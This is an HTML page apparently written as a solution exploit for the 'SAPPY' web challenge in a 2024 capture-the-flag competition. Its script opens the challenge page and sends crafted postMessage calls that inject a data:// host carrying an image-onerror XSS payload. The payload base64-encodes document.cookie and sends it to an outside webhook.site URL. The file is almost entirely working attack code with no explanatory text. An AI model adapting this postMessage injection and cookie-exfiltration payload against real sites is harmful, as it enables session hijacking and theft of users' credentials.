<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8" />
    <title>SAPPY</title>
</head>

<body>

    <script>
        const url = "https://sappy-web.2024.ctfcompetition.com";
        const win = window.open(`${url}/sap.html`);
        function exploit() {
            win.postMessage(
                '{"method": "initialize", "host": "data://sappy-web.2024.ctfcompetition.com/,{\\"html\\":\\"<img src=x onerror=\'location.href=`https://webhook.site/12fc89a1-4e74-4ec3-b300-d4f2c5b32133/`+btoa(document.cookie)\'>"}',
                url
            );

            win.postMessage(
                '{"method": "render", "page": "page13\\"}"}',
                url
            );
            loadPage();
        }
        setTimeout(exploit, 3000);
    </script>
</body>

</html>